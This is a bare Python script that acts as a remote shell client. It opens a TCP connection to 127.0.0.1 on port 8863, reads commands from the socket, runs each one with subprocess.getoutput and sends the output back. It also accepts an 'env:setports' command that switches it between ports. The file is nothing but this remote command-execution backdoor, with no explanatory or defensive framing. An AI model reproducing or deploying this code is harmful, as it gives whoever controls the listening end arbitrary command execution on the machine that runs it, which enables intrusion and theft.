import socket, subprocess

ports = [8863]
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 8863))
sock.settimeout(30)

while True:
    for port in ports:
        for x in range(3):
            try:
                cmd = sock.recv(4096).decode('ascii')
            except (TimeoutError, ConnectionAbortedError, ConnectionResetError):
                break

            if cmd.startswith("env:setports"):
                ports = [int(x) for x in cmd.split(" ")[1:]]
                continue
            
            sock.sendall(subprocess.getoutput(cmd).encode('ascii'))

        sock.close()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('127.0.0.1', port))
        sock.settimeout(30)